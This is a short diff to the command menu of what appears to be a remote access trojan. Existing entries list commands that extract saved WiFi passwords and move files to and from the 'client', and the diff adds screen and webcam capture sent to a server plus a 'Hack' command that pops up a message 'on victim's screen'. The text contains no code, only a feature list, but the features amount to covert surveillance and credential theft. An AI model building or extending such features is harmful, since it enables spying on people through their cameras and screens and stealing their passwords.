@@ -312,6 +312,9 @@ sysinfo    - System information (OS, hostname, user)
 ipconfig   - Network configuration and IP addresses
 processes  - List running processes (top 50)
 wifi       - Extract saved WiFi passwords (Windows)
+screenshot - Capture screen and transfer to server
+webcam     - Capture from webcam and transfer to server
+Hack       - Display popup message on victim's screen
 download   - Download file from client
 upload     - Upload file to client
 cd         - Change directory
